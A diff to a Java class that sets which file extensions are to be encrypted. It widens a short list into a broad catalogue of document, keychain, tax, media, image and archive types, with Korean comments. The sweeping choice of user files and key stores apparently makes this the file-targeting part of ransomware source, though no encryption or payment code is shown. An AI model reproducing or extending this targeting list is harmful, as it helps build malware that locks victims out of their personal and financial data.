@@ -136,24 +136,103 @@ public class SearchDirectory {
 
     /**
      * 암호화할 파일의 확장자 설정
+     * Common File Types
      */
     private void initContainFilter() {
-        containsFilters.add("jpg");
+        // Text files
+        containsFilters.add("doc");
         containsFilters.add("docx");
-        containsFilters.add("hwp");
-        containsFilters.add("pptx");
-        containsFilters.add("ppt");
-        containsFilters.add("avi");
-        containsFilters.add("mp4");
-        containsFilters.add("mkv");
-        containsFilters.add("max");
-        containsFilters.add("cad");
-        containsFilters.add("zip");
-        containsFilters.add("pdf");
-        containsFilters.add("psd");
+        containsFilters.add("log");
+        containsFilters.add("msg");
+        containsFilters.add("odt");
+        containsFilters.add("pages");
+        containsFilters.add("rtf");
+        containsFilters.add("tex");
         containsFilters.add("txt");
-        containsFilters.add("png");
+        containsFilters.add("wpd");
+        containsFilters.add("wps");
+
+        // Data files
+        containsFilters.add("csv");
+        containsFilters.add("dat");
+        containsFilters.add("gbr");
+        containsFilters.add("ged");
+        containsFilters.add("key");
+        containsFilters.add("keychain");
+        containsFilters.add("pps");
+        containsFilters.add("pps");
+        containsFilters.add("ppt");
+        containsFilters.add("pptx");
+        containsFilters.add("sdf");
+        containsFilters.add("tar");
+        containsFilters.add("tax2012");
+        containsFilters.add("tax2014");
+        containsFilters.add("vcf");
+        containsFilters.add("xml");
+
+        // Audio files
+        containsFilters.add("alf");
+        containsFilters.add("iff");
+        containsFilters.add("m3u");
+        containsFilters.add("m4a");
+        containsFilters.add("mid");
         containsFilters.add("mp3");
+        containsFilters.add("mpa");
+        containsFilters.add("ra");
+        containsFilters.add("wav");
+        containsFilters.add("wma");
+
+        // Video files
+        containsFilters.add("3g2");
+        containsFilters.add("3gp");
+        containsFilters.add("asf");
+        containsFilters.add("asf");
+        containsFilters.add("asx");
+        containsFilters.add("avi");
+        containsFilters.add("flv");
+        containsFilters.add("m4v");
+        containsFilters.add("mov");
+        containsFilters.add("mp4");
+        containsFilters.add("mpg");
+        containsFilters.add("rm");
+        containsFilters.add("srt");
+        containsFilters.add("swf");
+        containsFilters.add("vob");
+        containsFilters.add("wmv");
+
+        // 3D image files
+        containsFilters.add("3dm");
+        containsFilters.add("3ds");
+        containsFilters.add("max");
+        containsFilters.add("obj");
+
+        // Raster image files
+        containsFilters.add("bmp");
+        containsFilters.add("dds");
+        containsFilters.add("gif");
+        containsFilters.add("jpg");
+        containsFilters.add("png");
+        containsFilters.add("psd");
+        containsFilters.add("pspimage");
+        containsFilters.add("tga");
+        containsFilters.add("htm");
+        containsFilters.add("tif");
+        containsFilters.add("tiff");
+        containsFilters.add("yuv");
+
+        // Vector image files
+        containsFilters.add("ai");
+        containsFilters.add("eps");
+        containsFilters.add("ps");
+        containsFilters.add("svg");
+
+        // Page layout files
+        containsFilters.add("indd");
+        containsFilters.add("pct");
+        containsFilters.add("pdf");
+
+        // 아 귀찮다
+        // http://fileinfo.com/filetypes/common
     }
 
 
